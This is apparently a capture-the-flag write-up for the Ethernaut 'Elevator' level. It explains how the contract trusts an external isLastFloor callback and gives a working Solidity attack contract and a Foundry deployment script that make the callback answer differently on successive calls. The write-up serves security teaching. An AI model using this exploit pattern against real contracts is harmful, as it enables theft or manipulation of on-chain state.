# Ethernaut Level 11 Elevator

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

Our goal is to "reach the top", making `top` to be `true`. We can see that `top` is initialized as `false`. According to the logic in the function `goTo(uint256 _floor)`, we cannot modify the state of `top` if `building.isLastFloor(uint256)` returns same result for same floor. More precisely, if we can find a way that `building.isLastFloor(uint256)` returns `false` for the first time being called and then returns `true` for the second time, we can achieve our goal.

So we can inherit from `Building` interface and implement the logic:

`BuildingAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building} from "./Elevator.sol";
import {Elevator} from "./Elevator.sol";

contract BuildingAttack is Building {
    Elevator elevator;
    bool toggle;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
        toggle = true;
    }

    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack() external {
        elevator.goTo(10);
    }
}
```

In this attack contract, we just use a `toggle` to change the returns in a simple way. However, we changed the state since `toggle` is a state variable. If the function declaration in the interface is restricted to `view` or `pure`, we can use a different logic like `return gasleft() < SOME_THRESHOLD;` to acheive the same goal.

`Elevator.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";
import {BuildingAttack} from "../src/BuildingAttack.sol";

contract ElevatorScript is Script {
    Elevator elevator = Elevator(0xXXXXXXXXXXXX);

    function run() external {
        vm.startBroadcast();
        BuildingAttack buildingAttack = new BuildingAttack(address(elevator));
        buildingAttack.attack();
        vm.stopBroadcast();
        console.log("Elevator is at the top floor:", elevator.top());
    }
}
```

